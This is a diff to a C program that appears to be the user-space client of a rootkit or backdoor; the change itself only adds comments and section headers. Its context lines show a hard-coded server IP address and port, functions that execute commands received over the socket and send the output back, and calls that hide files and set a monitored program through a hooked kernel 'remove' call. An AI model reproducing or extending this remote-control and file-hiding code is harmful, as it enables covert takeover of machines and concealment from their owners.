@@ -11,16 +11,19 @@
 #include <sys/wait.h>
 #include <errno.h>
 
+/********************** define **********************/
 #define SP_PORT     8895
 #define BUFFER_SIZE 4096
 #define CMD_RESULT "cmdoutput.txttmp"
 #define MONITOR_RESULT "monitoroutput.txttmp"
 
+/********************** properties **********************/
 char* SERVER_ADDR = "104.194.96.169"; 
 char zero[1] = "0";
 char one[1] = "1"; 
 int set_monitor = 1; 
 
+/********************** methods **********************/
 int readbuf(int conn, char* buf, int size);
 int readline(int conn, char* buf, int size);
 int getIntFromBuf(char* buf, int offset);
@@ -92,6 +95,13 @@ int main(int argc,char* argv[])
     return 0;
 }
 
+/**
+ * @brief Send result back to server
+ * @param socket
+ * @param buf
+ * @param name
+ * @return 
+ */
 int sendresult(int socket, char* buf, char *name){
     FILE *fp;
     int i = 0;
@@ -114,6 +124,11 @@ int sendresult(int socket, char* buf, char *name){
     return 0;
 }
 
+/**
+ * @brief Hide a file because we hooked remove
+ * @param cmd
+ * @return 
+ */
 int hidefile(char* cmd){
     char filen[256] = "HIDEAFILEINKERNEL%";
     while(*cmd == ' ') cmd++;
@@ -121,6 +136,11 @@ int hidefile(char* cmd){
     remove(filen);          //We hooked remove;
 }
 
+/**
+ * @brief Do monitor setting and get monitor result
+ * @param cmd
+ * @return 
+ */
 int monitor(char* cmd){
     char filen[256] = "SETMONITORPROGRAM%";
     while(*cmd == ' ') cmd++;
@@ -144,6 +164,11 @@ int monitor(char* cmd){
     }
 }
 
+/**
+ * @brief Execute a cmd command
+ * @param cmd
+ * @return 
+ */
 int execcmd(char* cmd){
     char *args[20];
     int i, j, rv;
@@ -187,6 +212,13 @@ int execcmd(char* cmd){
     return rv;
 }
 
+/**
+ * @brief Read a certain size buff
+ * @param conn
+ * @param buf
+ * @param size
+ * @return 
+ */
 int readbuf(int conn, char* buf, int size){
     int cur = 0;
     while(cur < size){
@@ -198,6 +230,13 @@ int readbuf(int conn, char* buf, int size){
     return cur;
 }
 
+/**
+ * @brief Read a line
+ * @param conn
+ * @param buf
+ * @param size
+ * @return 
+ */
 int readline(int conn, char* buf, int size){
     int cur = 0;
     while(cur < size){
@@ -212,6 +251,12 @@ int readline(int conn, char* buf, int size){
     return cur;
 }
 
+/**
+ * @brief Transfer bytes(Big endian) into int value 
+ * @param buf
+ * @param offset
+ * @return 
+ */
 int getIntFromBuf(char* buf, int offset){
     int value;    
     value = (int) ( ((buf[offset] & 0xFF)<<24)  
